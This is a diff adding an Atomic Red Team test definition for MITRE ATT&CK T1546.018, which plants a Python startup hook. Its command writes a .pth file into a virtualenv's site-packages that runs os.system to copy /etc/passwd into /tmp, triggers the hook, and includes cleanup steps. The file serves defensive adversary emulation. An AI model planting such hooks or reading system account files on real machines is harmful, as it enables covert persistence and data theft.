@@ -1,0 +1,64 @@
+- id: a58c066d-f2f0-42a2-ab70-30af73f89e66
+  name: Python Startup Hook - atomic_hook.pth (Linux)
+  description: "Executes code by creating atomic_hook.pth in the site-packages directory.\
+    \ \nThis script runs automatically for every user on the system when Python starts."
+  tactic: privilege-escalation
+  technique:
+    attack_id: T1546.018
+    name: 'Event Triggered Execution: Python Startup Hooks'
+  platforms:
+    linux:
+      sh:
+        command: 'TEMPDIR="/tmp/atomic_sitecust_posix"; mkdir -p "$TEMPDIR"; "python3"
+          -m venv "$TEMPDIR/env"; SITE_PACKAGES=$("$TEMPDIR/env/bin/python3" -c "import
+          site; print(site.getsitepackages()[0])"); echo "import os; os.system(''cat
+          /etc/passwd 1> /tmp/atomic_hook_poc.txt'')" > "$SITE_PACKAGES/atomic_hook.pth";
+          ls -la "$SITE_PACKAGES/atomic_hook.pth"; "$TEMPDIR/env/bin/python" -c "print(''Triggering
+          Hook via atomic_hook...'')"; if [ -f /tmp/atomic_hook_poc.txt ]; then echo
+          "[+] Success: atomic_hook_poc.txt created under /tmp \n" $(ls -la /tmp/
+          | grep -w atomic_hook_poc.txt); else echo "Failed: /tmp/atomic_hook_poc.txt
+          not found"; fi'
+        cleanup: "if [ ! -f /tmp/atomic_hook_poc.txt ] || [ ! -d /tmp/atomic_sitecust_posix\
+          \ ]; then echo \"[!] Missing artifact or folder: /tmp/atomic_hook_poc.txt\
+          \ or /tmp/atomic_sitecust_posix \u2014 [-] Please Run : Invoke-AtomicTest\
+          \ T1546.018\"; exit 0; fi; rm -rf /tmp/atomic_sitecust_posix; echo \"[+]\
+          \ Successful Removed atomic_hook.pth\"; rm -rf /tmp/atomic_hook_poc.txt;\
+          \ echo \"[+] Successful Removed atomic_hook_poc.txt under /tmp\""
+        elevation_required: false
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - atomic-red-team
+  - privilege-escalation
+  - t1546.018
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      python_exe:
+        description: The python binary name to test
+        type: String
+        default: python3
+    dependencies:
+    - description: 'Python must be installed and the specified binary (#{python_exe})
+        must be in the PATH.
+
+        '
+      prereq_command: 'PYTHON_CMD=$(command -v #{python_exe} || command -v python)
+
+        if [ -z "$PYTHON_CMD" ]; then exit 1; fi
+
+        $PYTHON_CMD -m venv --help >/dev/null 2>&1
+
+        '
+      get_prereq_command: 'echo "Python not found. Please install Python using your
+        package manager (e.g., Debian Based ''sudo apt-get update && sudo apt-get
+        install -y python3 python3-venv'', RedHat / CentOS Based ''sudo yum install
+        -y python3 python3-venv || sudo dnf install -y python3 python3-venv'')."
+
+        '
+    technique_created: '2025-05-22T19:20:46.740Z'
+    atomic_guid: a58c066d-f2f0-42a2-ab70-30af73f89e66
+    import_timestamp: '2026-01-20T03:44:38.466201Z'
